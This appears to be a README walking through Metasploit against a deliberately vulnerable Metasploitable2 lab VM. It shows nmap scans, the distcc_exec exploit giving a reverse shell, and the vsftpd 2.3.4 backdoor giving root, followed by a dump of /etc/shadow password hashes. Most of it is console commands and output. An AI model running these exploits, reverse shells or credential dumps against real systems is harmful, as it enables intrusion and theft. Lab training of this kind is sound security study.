# Metasploit-Demo
This repo is created to demonstrate the working and installation steps for Metasploit tool created by Rapid7, the repo will cover the use cases, test scenarios and other configuration steps needed for the proper setup and working of the tool.

# Metasploit Framework
Metasploit Framework is an open-source project maintained by Rapid7 and the community. It provides a large collection of exploits, payloads (including Meterpreter), encoders, tools like msfconsole and msfvenom, and a platform for writing and testing new modules.

# Features
1. Modular architecture: exploits, payloads, auxiliaries, post modules.
2. Interactive console (msfconsole) for orchestration and automation.
3. Payload generator and packer
4. Community contributed modules and documentation; active GitHub repo and docs site

# Installing Metasploit
Metasploit is already a part of generic version of Kali linux distributions. 

You can check if you have metasploit installed in your distribution by simply running the command msfconsole in your terminal, if you are able to enter the cli for metasploit that means that metasploit is available in your system.

If running msfconsole does not open up as above, then perform the below steps to start the installation
```
curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb > msfinstall && \
chmod 755 msfinstall && \
./msfinstall
```

More informtion regarding installation is available in the official metasploit website: https://docs.metasploit.com/docs/using-metasploit/getting-started/nightly-installers.html#installing-metasploit-on-linux--macos

# Use cases
The demonstration shown here is done in a virtual box environment running Kali Linux and Metasploitable2 running in the same network.

To get details on the commands and other key functionalities run the help command whe inside the msfconsole.

Metasploitable2 is a intentionally vulnerable machine made by Rapid7 so that users can test and run the metasploit tool for demonstration purposes.
The official link to download metasploitable2 is: https://www.rapid7.com/products/metasploit/metasploitable/

The directory where the scripts, payloads, exploits and other files used by metasploit are present in is in the location /usr/share/metasploit-framework/

```
┌──(kali㉿kali)-[/usr/share/metasploit-framework]
└─$ ls
app     data  docs           Gemfile       lib                           modules     msfd   msf-json-rpc.ru  msfrpcd    msfvenom   plugins   ruby            script-password  scripts  vendor
config  db    documentation  Gemfile.lock  metasploit-framework.gemspec  msfconsole  msfdb  msfrpc           msfupdate  msf-ws.ru  Rakefile  script-exploit  script-recon     tools

                                        
┌──(kali㉿kali)-[/usr/share/metasploit-framework/modules]
└─$ ls
auxiliary  encoders  evasion  exploits  nops  payloads  post  README.md
```

Below are the steps performed for the demonstration:

Step 1 : Start Kali linux and Metasploitable 2 in the Virtual Machine.

Step 2 : Ensure that both the virtual machines are connected to the same network.

Step 3 : After ensuring that both the machines are up, open the Kali Linux terminal and run a nmap scan to find the ip address of the corresponding metasploitable system 

```
nmap -sn 192.168.100.0/24

o/p:
Starting Nmap 7.95 ( https://nmap.org ) at 2025-10-29 14:35 EDT
Nmap scan report for 192.168.100.1
Host is up (0.00038s latency).
MAC Address: 52:54:00:12:35:00 (QEMU virtual NIC)
Nmap scan report for 192.168.100.2
Host is up (0.00034s latency).
MAC Address: 52:54:00:12:35:00 (QEMU virtual NIC)
Nmap scan report for 192.168.100.3
Host is up (0.00032s latency).
MAC Address: 08:00:27:3A:EF:55 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
Nmap scan report for 192.168.100.7
Host is up (0.00060s latency).
MAC Address: 08:00:27:48:8D:1A (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
Nmap scan report for 192.168.100.4
Host is up.
Nmap done: 256 IP addresses (5 hosts up) scanned in 2.14 seconds
```
From the above output we have got the IP address of the metasploitable machine as 192.168.100.7, this will be the target machine on which we will perform the attack.

Step 4 : Run nmap to check the open ports and their versions to get an idea of available software running in the machine.

```
 ┌──(kali㉿kali)-[~]
└─$ nmap -sV 192.168.100.7   
Starting Nmap 7.95 ( https://nmap.org ) at 2025-10-29 14:39 EDT
Nmap scan report for 192.168.100.7
Host is up (0.00014s latency).
Not shown: 977 closed tcp ports (reset)
PORT     STATE SERVICE     VERSION
21/tcp   open  ftp         vsftpd 2.3.4
22/tcp   open  ssh         OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)
23/tcp   open  telnet      Linux telnetd
25/tcp   open  smtp        Postfix smtpd
53/tcp   open  domain      ISC BIND 9.4.2
80/tcp   open  http        Apache httpd 2.2.8 ((Ubuntu) DAV/2)
111/tcp  open  rpcbind     2 (RPC #100000)
139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
512/tcp  open  exec        netkit-rsh rexecd
513/tcp  open  login?
514/tcp  open  tcpwrapped
1099/tcp open  java-rmi    GNU Classpath grmiregistry
1524/tcp open  bindshell   Metasploitable root shell
2049/tcp open  nfs         2-4 (RPC #100003)
2121/tcp open  ftp         ProFTPD 1.3.1
3306/tcp open  mysql       MySQL 5.0.51a-3ubuntu5
5432/tcp open  postgresql  PostgreSQL DB 8.3.0 - 8.3.7
5900/tcp open  vnc         VNC (protocol 3.3)
6000/tcp open  X11         (access denied)
6667/tcp open  irc         UnrealIRCd
8009/tcp open  ajp13       Apache Jserv (Protocol v1.3)
8180/tcp open  http        Apache Tomcat/Coyote JSP engine 1.1
MAC Address: 08:00:27:48:8D:1A (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
Service Info: Hosts:  metasploitable.localdomain, irc.Metasploitable.LAN; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 12.70 seconds
```

Step 5: Running metasploit in the system

```
┌──(kali㉿kali)-[~]
└─$ msfconsole
Metasploit tip: Enable verbose logging with set VERBOSE true
                                                  
 ______________________________________
/ it looks like you're trying to run a \
\ module                               /
 --------------------------------------
 \
  \
     __
    /  \
    |  |
    @  @
    |  |
    || |/
    || ||
    |\_/|
    \___/


       =[ metasploit v6.4.64-dev                          ]
+ -- --=[ 2519 exploits - 1296 auxiliary - 431 post       ]
+ -- --=[ 1607 payloads - 49 encoders - 13 nops           ]
+ -- --=[ 9 evasion                                       ]

Metasploit Documentation: https://docs.metasploit.com/

msf6 >
```
This shows that we have gained access to the console.

Step 5 : Using an exploit

An exploit is used to take advantage of a vulnerability, out of the many vulneriabilites in the metasploit machine, we have chosen to take advantage of the distcc vulnerability.

```
msf6 > use exploit/unix/misc/
use exploit/unix/misc/distcc_exec                  use exploit/unix/misc/polycom_hdx_traceroute_exec  use exploit/unix/misc/xerox_mfp                    
use exploit/unix/misc/polycom_hdx_auth_bypass      use exploit/unix/misc/spamassassin_exec            use exploit/unix/misc/zabbix_agent_exec            
msf6 > use exploit/unix/misc/distcc_exec 
[*] No payload configured, defaulting to cmd/unix/reverse_bash
msf6 exploit(unix/misc/distcc_exec) > options

Module options (exploit/unix/misc/distcc_exec):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   CHOST                     no        The local client address
   CPORT                     no        The local client port
   Proxies                   no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS                    yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
   RPORT    3632             yes       The target port (TCP)


Payload options (cmd/unix/reverse_bash):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  192.168.100.4    yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Automatic Target



View the full module info with the info, or info -d command.

msf6 exploit(unix/misc/distcc_exec) >
```

The expolit used above is the distcc_exec vulneribilty, more information on the vulneribility regarding the CVE score and other details are avaialbale in the site: https://www.cvedetails.com/cve/CVE-2004-2687/

distcc is a tool that enhances the compilation process by utilizing the idle processing power of other computers in the network. When distcc is set up on a machine, this machine is capable of distributing its compilation tasks to another system.

Step 6 : Setting up the required parameters to run the exploit

```
msf6 exploit(unix/misc/distcc_exec) > set RHOST 192.168.100.7
RHOST => 192.168.100.7
msf6 exploit(unix/misc/distcc_exec) > options

Module options (exploit/unix/misc/distcc_exec):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   CHOST                     no        The local client address
   CPORT                     no        The local client port
   Proxies                   no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS   192.168.100.7    yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
   RPORT    3632             yes       The target port (TCP)


Payload options (cmd/unix/reverse_bash):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  192.168.100.4    yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Automatic Target


View the full module info with the info, or info -d command.
```

Info related to any exploit can be seen by running the info command

```
msf6 exploit(unix/misc/distcc_exec) > info

       Name: DistCC Daemon Command Execution
     Module: exploit/unix/misc/distcc_exec
   Platform: Unix
       Arch: cmd
 Privileged: No
    License: Metasploit Framework License (BSD)
       Rank: Excellent
  Disclosed: 2002-02-01

Provided by:
  hdm <x@hdm.io>

Available targets:
      Id  Name
      --  ----
  =>  0   Automatic Target

Check supported:
  Yes

Basic options:
  Name    Current Setting  Required  Description
  ----    ---------------  --------  -----------
  RHOSTS  192.168.100.7    yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
  RPORT   3632             yes       The target port (TCP)

Payload information:
  Space: 1024

Description:
  This module uses a documented security weakness to execute
  arbitrary commands on any system running distccd.

References:
  https://nvd.nist.gov/vuln/detail/CVE-2004-2687
  OSVDB (13378)
  http://distcc.samba.org/security.html


View the full module info with the info -d command.
```

Step 7 : Using the exploit

```
msf6 exploit(unix/misc/distcc_exec) > 
msf6 exploit(unix/misc/distcc_exec) > exploit
[*] Started reverse TCP handler on 192.168.100.4:4444 
[*] 192.168.100.7:3632 - stderr: bash: 100: Bad file descriptor
[*] 192.168.100.7:3632 - stderr: bash: /dev/tcp/192.168.100.4/4444: No such file or directory
[*] 192.168.100.7:3632 - stderr: bash: 100: Bad file descriptor
[*] Exploit completed, but no session was created.
```
The above snippet shows that a session was not created, this is because the payload used is not compatible, to fix this issue we will have to use a different payload.

Running the show payloads command to see the list of supported payloads

```
msf6 exploit(unix/misc/distcc_exec) > show payloads

Compatible Payloads
===================

   #   Name                                        Disclosure Date  Rank    Check  Description
   -   ----                                        ---------------  ----    -----  -----------
   0   payload/cmd/unix/adduser                    .                normal  No     Add user with useradd
   1   payload/cmd/unix/bind_perl                  .                normal  No     Unix Command Shell, Bind TCP (via Perl)
   2   payload/cmd/unix/bind_perl_ipv6             .                normal  No     Unix Command Shell, Bind TCP (via perl) IPv6
   3   payload/cmd/unix/bind_ruby                  .                normal  No     Unix Command Shell, Bind TCP (via Ruby)
   4   payload/cmd/unix/bind_ruby_ipv6             .                normal  No     Unix Command Shell, Bind TCP (via Ruby) IPv6
   5   payload/cmd/unix/generic                    .                normal  No     Unix Command, Generic Command Execution
   6   payload/cmd/unix/reverse                    .                normal  No     Unix Command Shell, Double Reverse TCP (telnet)
   7   payload/cmd/unix/reverse_bash               .                normal  No     Unix Command Shell, Reverse TCP (/dev/tcp)
   8   payload/cmd/unix/reverse_bash_telnet_ssl    .                normal  No     Unix Command Shell, Reverse TCP SSL (telnet)
   9   payload/cmd/unix/reverse_openssl            .                normal  No     Unix Command Shell, Double Reverse TCP SSL (openssl)
   10  payload/cmd/unix/reverse_perl               .                normal  No     Unix Command Shell, Reverse TCP (via Perl)
   11  payload/cmd/unix/reverse_perl_ssl           .                normal  No     Unix Command Shell, Reverse TCP SSL (via perl)
   12  payload/cmd/unix/reverse_ruby               .                normal  No     Unix Command Shell, Reverse TCP (via Ruby)
   13  payload/cmd/unix/reverse_ruby_ssl           .                normal  No     Unix Command Shell, Reverse TCP SSL (via Ruby)
   14  payload/cmd/unix/reverse_ssl_double_telnet  .                normal  No     Unix Command Shell, Double Reverse TCP SSL (telnet)

msf6 exploit(unix/misc/distcc_exec) > set PAYLOAD payload/cmd/unix/reverse
PAYLOAD => cmd/unix/reverse
```

After setting up the new payload run the exploit command again

```
msf6 exploit(unix/misc/distcc_exec) > exploit
[*] Started reverse TCP double handler on 192.168.100.4:4444 
[*] Accepted the first client connection...
[*] Accepted the second client connection...
[*] Command: echo 2u3bvltXQECRM6B2;
[*] Writing to socket A
[*] Writing to socket B
[*] Reading from sockets...
[*] Reading from socket B
[*] B: "2u3bvltXQECRM6B2\r\n"
[*] Matching...
[*] A is input...
[*] Command shell session 1 opened (192.168.100.4:4444 -> 192.168.100.7:43447) at 2025-10-29 15:10:36 -0400


ls
5039.jsvc_up
whoami
daemon
/usr/bin/bash
sh: line 10: /usr/bin/bash: No such file or directory
/usr/bin/sh
sh: line 11: /usr/bin/sh: No such file or directory
pytho
sh: line 12: pytho: command not found
python
python3
print("hi") 
python -c 'import pty; pty.spawn("/bin/bash")'
  File "<stdin>", line 3
    python -c 'import pty; pty.spawn("/bin/bash")'
                                                 ^
SyntaxError: invalid syntax
python3 -c 'import pty; pty.spawn("/bin/bash")'
sh: line 14: python3: command not found
python -c 'import pty; pty.spawn("/bin/bash")'
daemon@metasploitable:/tmp$ ls
ls
5039.jsvc_up
daemon@metasploitable:/tmp$ cd /
cd /
daemon@metasploitable:/$ whoami
whoami
daemon
daemon@metasploitable:/$ ifconfig
ifconfig
eth0      Link encap:Ethernet  HWaddr 08:00:27:48:8d:1a  
          inet addr:192.168.100.7  Bcast:192.168.100.255  Mask:255.255.255.0
          inet6 addr: fe80::a00:27ff:fe48:8d1a/64 Scope:Link
          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
          RX packets:2686 errors:0 dropped:0 overruns:0 frame:0
          TX packets:1621 errors:0 dropped:0 overruns:0 carrier:0
          collisions:0 txqueuelen:1000 
          RX bytes:192217 (187.7 KB)  TX bytes:157188 (153.5 KB)
          Base address:0xd020 Memory:f0200000-f0220000 

lo        Link encap:Local Loopback  
          inet addr:127.0.0.1  Mask:255.0.0.0
          inet6 addr: ::1/128 Scope:Host
          UP LOOPBACK RUNNING  MTU:16436  Metric:1
          RX packets:489 errors:0 dropped:0 overruns:0 frame:0
          TX packets:489 errors:0 dropped:0 overruns:0 carrier:0
          collisions:0 txqueuelen:0 
          RX bytes:213429 (208.4 KB)  TX bytes:213429 (208.4 KB)

daemon@metasploitable:/$ 
```
From the above snippet, a shell has been spawned where standard linux commands such as ls,whoami, etc will work. The command "python -c 'import pty; pty.spawn("/bin/bash")'" is used to create a bash terminal in the spawned shell, so that going through directories and other functions are easier.

The username daemon@metasploitable suggests that we are not the root user but a user named daemon.

Step 8 : Using another exploit to gain system access  (vsftpd)

In a new terminal run the nmap scan 

```
 ┌──(kali㉿kali)-[~]
└─$ nmap -sV 192.168.100.7   
Starting Nmap 7.95 ( https://nmap.org ) at 2025-10-29 14:39 EDT
Nmap scan report for 192.168.100.7
Host is up (0.00014s latency).
Not shown: 977 closed tcp ports (reset)
PORT     STATE SERVICE     VERSION
21/tcp   open  ftp         vsftpd 2.3.4
22/tcp   open  ssh         OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)
23/tcp   open  telnet      Linux telnetd
25/tcp   open  smtp        Postfix smtpd
53/tcp   open  domain      ISC BIND 9.4.2
80/tcp   open  http        Apache httpd 2.2.8 ((Ubuntu) DAV/2)
111/tcp  open  rpcbind     2 (RPC #100000)
139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
512/tcp  open  exec        netkit-rsh rexecd
513/tcp  open  login?
514/tcp  open  tcpwrapped
1099/tcp open  java-rmi    GNU Classpath grmiregistry
1524/tcp open  bindshell   Metasploitable root shell
2049/tcp open  nfs         2-4 (RPC #100003)
2121/tcp open  ftp         ProFTPD 1.3.1
3306/tcp open  mysql       MySQL 5.0.51a-3ubuntu5
5432/tcp open  postgresql  PostgreSQL DB 8.3.0 - 8.3.7
5900/tcp open  vnc         VNC (protocol 3.3)
6000/tcp open  X11         (access denied)
6667/tcp open  irc         UnrealIRCd
8009/tcp open  ajp13       Apache Jserv (Protocol v1.3)
8180/tcp open  http        Apache Tomcat/Coyote JSP engine 1.1
MAC Address: 08:00:27:48:8D:1A (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
Service Info: Hosts:  metasploitable.localdomain, irc.Metasploitable.LAN; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 12.70 seconds
```

From the scan result it is seen that port 21 is open, this port is used by ftp service and the version used is vsftpd 2.3.4, this version has a backdoor which we can exploit to gain root access of the system.

Step 9 : Search and use the required module for exploitation

```
msf6 > search vsftpd

Matching Modules
================

   #  Name                                  Disclosure Date  Rank       Check  Description
   -  ----                                  ---------------  ----       -----  -----------
   0  auxiliary/dos/ftp/vsftpd_232          2011-02-03       normal     Yes    VSFTPD 2.3.2 Denial of Service
   1  exploit/unix/ftp/vsftpd_234_backdoor  2011-07-03       excellent  No     VSFTPD v2.3.4 Backdoor Command Execution


Interact with a module by name or index. For example info 1, use 1 or use exploit/unix/ftp/vsftpd_234_backdoor

msf6 > use exploit/unix/ftp/vsftpd_234_backdoor
[*] No payload configured, defaulting to cmd/unix/interact
msf6 exploit(unix/ftp/vsftpd_234_backdoor) > options

Module options (exploit/unix/ftp/vsftpd_234_backdoor):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   CHOST                     no        The local client address
   CPORT                     no        The local client port
   Proxies                   no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS                    yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
   RPORT    21               yes       The target port (TCP)


Exploit target:

   Id  Name
   --  ----
   0   Automatic



View the full module info with the info, or info -d command.

msf6 exploit(unix/ftp/vsftpd_234_backdoor) > show payloads

Compatible Payloads
===================

   #  Name                       Disclosure Date  Rank    Check  Description
   -  ----                       ---------------  ----    -----  -----------
   0  payload/cmd/unix/interact  .                normal  No     Unix Command, Interact with Established Connection

msf6 exploit(unix/ftp/vsftpd_234_backdoor) > 

msf6 exploit(unix/ftp/vsftpd_234_backdoor) > options

Module options (exploit/unix/ftp/vsftpd_234_backdoor):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   CHOST                     no        The local client address
   CPORT                     no        The local client port
   Proxies                   no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS                    yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
   RPORT    21               yes       The target port (TCP)


Exploit target:

   Id  Name
   --  ----
   0   Automatic



View the full module info with the info, or info -d command.
```


Step 10 : Using the exploit

```
msf6 exploit(unix/ftp/vsftpd_234_backdoor) > set RHOST 192.168.100.7
RHOST => 192.168.100.7
msf6 exploit(unix/ftp/vsftpd_234_backdoor) > options

Module options (exploit/unix/ftp/vsftpd_234_backdoor):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   CHOST                     no        The local client address
   CPORT                     no        The local client port
   Proxies                   no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS   192.168.100.7    yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
   RPORT    21               yes       The target port (TCP)


Exploit target:

   Id  Name
   --  ----
   0   Automatic



View the full module info with the info, or info -d command.

msf6 exploit(unix/ftp/vsftpd_234_backdoor) > 


msf6 exploit(unix/ftp/vsftpd_234_backdoor) > exploit
[*] 192.168.100.7:21 - Banner: 220 (vsFTPd 2.3.4)
[*] 192.168.100.7:21 - USER: 331 Please specify the password.
[+] 192.168.100.7:21 - Backdoor service has been spawned, handling...
[+] 192.168.100.7:21 - UID: uid=0(root) gid=0(root)
[*] Found shell.
[*] Command shell session 4 opened (192.168.100.4:40703 -> 192.168.100.7:6200) at 2025-10-29 15:59:33 -0400

ls
bin
boot
cdrom
dev
etc
home
initrd
initrd.img
lib
lost+found
media
mnt
nohup.out
opt
proc
root
sbin
srv
sys
tmp
usr
var
vmlinuz

whoami
root

cat /etc/shadow	
root:$1$/avpfBJ1$x0z8w5UF9Iv./DR9E9Lid.:14747:0:99999:7:::
daemon:*:14684:0:99999:7:::
bin:*:14684:0:99999:7:::
sys:$1$fUX6BPOt$Miyc3UpOzQJqz4s5wFD9l0:14742:0:99999:7:::
sync:*:14684:0:99999:7:::
games:*:14684:0:99999:7:::
man:*:14684:0:99999:7:::
lp:*:14684:0:99999:7:::
mail:*:14684:0:99999:7:::
news:*:14684:0:99999:7:::
uucp:*:14684:0:99999:7:::
proxy:*:14684:0:99999:7:::
www-data:*:14684:0:99999:7:::
backup:*:14684:0:99999:7:::
list:*:14684:0:99999:7:::
irc:*:14684:0:99999:7:::
gnats:*:14684:0:99999:7:::
nobody:*:14684:0:99999:7:::
libuuid:!:14684:0:99999:7:::
dhcp:*:14684:0:99999:7:::
syslog:*:14684:0:99999:7:::
klog:$1$f2ZVMS4K$R9XkI.CmLdHhdUE3X9jqP0:14742:0:99999:7:::
sshd:*:14684:0:99999:7:::
msfadmin:$1$XN10Zj2c$Rt/zzCW3mLtUWA.ihZjA5/:14684:0:99999:7:::
bind:*:14685:0:99999:7:::
postfix:*:14685:0:99999:7:::
ftp:*:14685:0:99999:7:::
postgres:$1$Rw35ik.x$MgQgZUuO5pAoUvfJhfcYe/:14685:0:99999:7:::
mysql:!:14685:0:99999:7:::
tomcat55:*:14691:0:99999:7:::
distccd:*:14698:0:99999:7:::
user:$1$HESu9xrH$k.o3G93DGoXIiQKkPmUgZ0:14699:0:99999:7:::
service:$1$kR3ue7JZ$7GxELDupr5Ohp6cjZ3Bu//:14715:0:99999:7:::
telnetd:*:14715:0:99999:7:::
proftpd:!:14727:0:99999:7:::
statd:*:15474:0:99999:7:::
```

On setting the required paramters required for the exploit and running the exploit, a reverse shell access is given and on checking the user it is seen that e have got access as the root user, an example to prove this is that when running the cat /etc/shadow command we re getting the shadow file which ususally stores the users in a ystem, along with their hashed password, this operation can only be performed by a root user and no other user can display the /etc/shadow file.


